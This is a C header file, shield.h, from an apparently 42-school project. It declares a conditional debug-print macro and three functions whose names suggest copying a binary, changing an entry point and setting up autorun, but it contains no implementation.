/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   shield.h                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: kiroussa <oss@xtrm.me>                     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/03/23 02:45:19 by kiroussa          #+#    #+#             */
/*   Updated: 2025/03/25 23:21:44 by kiroussa         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef SHIELD_H
# define SHIELD_H

# ifndef SHIELD_DEBUG
#  define SHIELD_DEBUG 0
#  define DEBUG(fmt, ...)
# else
#  define DEBUG(fmt, ...) printf("[DEBUG] " fmt __VA_OPT__(,) __VA_ARGS__)
# endif // !SHIELD_DEBUG

int		shield_copy(void);
int		shield_change_entry(int bin);
int		shield_autorun_setup(void);

#endif // SHIELD_H
